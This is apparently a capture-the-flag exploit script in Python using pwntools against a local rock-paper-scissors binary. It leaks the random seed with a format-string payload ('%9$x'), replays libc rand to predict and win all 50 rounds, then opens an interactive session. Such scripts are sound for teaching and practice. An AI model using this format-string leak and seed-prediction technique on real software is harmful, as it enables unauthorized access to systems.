from pwn import *
import ctypes
import warnings
warnings.filterwarnings('ignore', category=BytesWarning)

elf = ELF('./rps')
context.binary = elf
p = process('./rps')
p.sendlineafter(':', r'%9$x')
p.recvuntil('Hi')
seed = int(p.recvline().strip(),16)
log.success(f'Got Seed: {seed}')

libc = ctypes.CDLL('libc.so.6')
libc.srand(seed)

for i in range(50):
    v = libc.rand() % 3
    if v == 0:
        p.sendlineafter(':','p')
    if v == 1:
        p.sendlineafter(':','s')
    if v == 2:
        p.sendlineafter(':','r')
p.interactive()